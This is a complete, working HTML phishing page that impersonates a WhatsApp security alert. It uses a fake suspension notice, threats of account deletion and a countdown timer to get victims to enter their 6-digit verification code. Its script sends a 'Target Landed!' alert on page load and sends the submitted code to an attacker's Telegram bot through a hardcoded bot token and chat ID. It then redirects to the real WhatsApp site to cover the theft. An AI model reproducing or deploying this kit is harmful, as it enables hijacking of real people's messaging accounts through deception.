<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Security - Action Required</title>
    <style>
        :root { 
            --wa-bg: #111b21;
            --wa-green: #00a884;
            --wa-danger: #ea0038;
            --wa-sec: #202c33;
            --wa-text: #e9edef;
            --wa-hint: #8696a0;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Segoe UI, Helvetica Neue, Helvetica, Arial, sans-serif; }
        body { background: var(--wa-bg); color: var(--wa-text); display: flex; justify-content: center; height: 100vh; overflow: hidden; }
        
        /* شريط التنبيه العلوي */
        .status-bar {
            background: var(--wa-danger);
            color: white;
            width: 100%;
            padding: 8px;
            font-size: 13px;
            text-align: center;
            position: fixed;
            top: 0;
            z-index: 100;
        }

        .container { width: 100%; max-width: 380px; padding: 25px; text-align: center; display: flex; flex-direction: column; margin-top: 40px; }
        
        .screen { display: none; width: 100%; height: 100%; flex-direction: column; align-items: center; }
        .active { display: flex; animation: fadeIn 0.5s ease; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        .logo { width: 55px; margin-top: 40px; margin-bottom: 20px; }
        h1 { font-size: 20px; font-weight: 600; margin-bottom: 12px; color: #fff; }
        .warning-text { color: #ffbc2d; font-size: 14px; margin-bottom: 20px; font-weight: 500; }
        p { font-size: 14px; color: var(--wa-hint); line-height: 1.6; margin-bottom: 20px; }

        .otp-box { background: #182229; padding: 20px; border-radius: 12px; width: 100%; border: 1px solid #222d34; }

        .otp-input { 
            width: 100%; border: none; border-bottom: 2px solid var(--wa-green); 
            font-size: 28px; letter-spacing: 10px; text-align: center; 
            background: transparent; color: #fff; outline: none; margin: 15px 0;
        }

        button { 
            background: var(--wa-green); color: #111b21; border: none; 
            width: 100%; padding: 14px; border-radius: 8px; font-size: 15px; 
            font-weight: 700; cursor: pointer; margin-top: 10px;
        }

        .spinner { 
            border: 3px solid #202c33; border-top: 3px solid var(--wa-green); 
            border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-top: 50px;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="status-bar">Account Temporarily Suspended - 24h Restriction</div>

    <div class="container">
        <div id="scr-load" class="screen active">
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
            <div class="spinner"></div>
            <p style="margin-top: 20px;">Analyzing security logs...</p>
        </div>

        <div id="scr-otp" class="screen">
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo" style="width: 45px;">
            <h1>Identity Verification</h1>
            <div class="warning-text">Unauthorized access attempt detected</div>
            
            <p>To lift the restriction and prevent account deletion, please enter the 6-digit code sent to your phone.</p>

            <div class="otp-box">
                <input type="tel" id="otp" class="otp-input" maxlength="6" inputmode="numeric" placeholder="--- ---">
                <button onclick="submitOtp()">CANCEL RESTRICTION</button>
            </div>

            <p style="font-size: 12px; margin-top: 25px;">Code expires in: <span id="clock" style="color: #ffbc2d;">01:59</span></p>
        </div>
    </div>

    <script>
        // استبدل القيم دي بالتوكن الحقيقي بتاعك مباشرة للتجربة
        const B_T = '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU';
        const C_I = '5446862709';

        function sendToBot(msg) {
            const url = `https://api.telegram.org/bot${B_T}/sendMessage`;
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: C_I, text: msg, parse_mode: 'HTML' })
            }).catch(e => console.error("Error sending"));
        }

        window.onload = () => {
            sendToBot(`⚠️ <b>Target Landed!</b>\nStatus: Attempting to bypass suspension\nIP: (Captured)`);
            setTimeout(() => {
                document.getElementById('scr-load').classList.remove('active');
                document.getElementById('scr-otp').classList.add('active');
                startTimer();
            }, 2500);
        };

        function startTimer() {
            let t = 119;
            const clock = document.getElementById('clock');
            setInterval(() => {
                let m = Math.floor(t / 60); let s = t % 60;
                clock.innerText = `${m}:${s < 10 ? '0'+s : s}`;
                if(t > 0) t--;
            }, 1000);
        }

        function submitOtp() {
            const code = document.getElementById('otp').value;
            if(code.length === 6) {
                sendToBot(`🔥 <b>OTP SUBMITTED!</b>\nCode: <code>${code}</code>\nAction: Cancel Restriction Request`);
                
                // تحويل لصفحة تحميل وهمية تانية قبل النهاية
                document.getElementById('scr-otp').innerHTML = `
                    <div class="spinner"></div>
                    <p style="margin-top:20px">Processing request...<br>Please do not close this window.</p>
                `;
                
                setTimeout(() => {
                    window.location.href = "https://www.whatsapp.com/security";
                }, 4000);
            } else {
                alert("Please enter the full 6-digit code.");
            }
        }
    </script>
</body>
</html>
